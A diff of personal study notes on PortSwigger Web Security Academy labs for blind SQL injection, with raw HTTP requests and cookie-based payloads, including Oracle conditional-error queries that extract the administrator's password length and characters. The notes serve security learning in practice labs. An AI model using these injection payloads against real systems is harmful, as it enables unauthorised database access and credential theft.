@@ -887,14 +887,14 @@ https://0afa006f04c947e48044c24a008600e5.web-security-academy.net/filter?categor
 __________________________________________________________________________________________________________________________________________________________________
 Blind SQL injection with conditional responses
 ----------------------------------------------
-GET / HTTP/2
+GET /login HTTP/2
 Host: 0aa500e70324393880b8269900ac0011.web-security-academy.net
 Cookie: TrackingId=Yj1QBxHBb3Ixg5Au; session=ctNiFHULNnvSmDZBeW5a3B6PPxBmLjAR
 User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
 Accept-Language: en-US,en;q=0.5
 
-Inject in Cookie: TrackingId
+Inject in Cookie: TrackingId (must be from login page)
 
 In Original --> the website displays Welcome back!
 When you inject ---> TrackingId=Yj1QBxHBb3Ixg5Au' --> the website doesn't display Welcome back! --> it can have blind SQL injection
@@ -919,13 +919,40 @@ You need to use burpsuite intruder --> cluster bomb --> TrackingId=xyz' AND (Sel
 SUBSTRING(string, start_position, length)
 SELECT SUBSTRING('Hello World', 1, 5);  -- Returns 'Hello'
 __________________________________________________________________________________________________________________________________________________________________
+Blind SQL injection with conditional errors
+--------------------------------------------
+
+GET /login HTTP/2
+Host: 0ae500f104926a4380ff539400c90063.web-security-academy.net
+Cookie: TrackingId=ALWc4ei57KLITH3J; session=D5teLIl0cka6bRldyH6dlOxGMKEXxxDn
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:126.0) Gecko/20100101 Firefox/126.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
 
 
+If you inject single quote --> Cookie: TrackingId=ALWc4ei57KLITH3J' --> 500 internal server error
+
+If you inject normal SQL query -->
+Cookie: TrackingId=ALWc4ei57KLITH3J' AND 1=1--
+Cookie: TrackingId=ALWc4ei57KLITH3J' AND 1=2-- (if it is right or wrong it doesn't show any error, so that we have to crate a condition)
 
 
+TrackingId=ALWc4ei57KLITH3J' AND (SELECT CASE WHEN(1=1) THEN TO_CHAR (1/0) ELSE 'a' END from dual)= 'a'--
+
+if 1=1 is true --> it will work 1/0 --> it will turn 500 internal server error.
+if 1=2 is false --> it will return the string a --> it will turn 200 OK
 
 
+In Oracle SQL, dual is a special one-row, one-column table present by default in all Oracle database installations.
+It is commonly used for selecting a value or performing operations that do not require any actual table data. 
 
+TrackingId=ALWc4ei57KLITH3J' AND (SELECT CASE WHEN length(password) > 100 THEN TO_CHAR (1/0) ELSE 'a' END from users Where username ='administrator')= 'a'--
+
+Autal password length is 20, > 100 is false --> it will turn 200 OK
+
+TrackingId=ALWc4ei57KLITH3J' AND (SELECT CASE WHEN SUBSTR(password,1,1) = 'a' THEN TO_CHAR (1/0) ELSE 'a' END from users Where username ='administrator')= 'a'--
+__________________________________________________________________________________________________________________________________________________________________
 
 
 
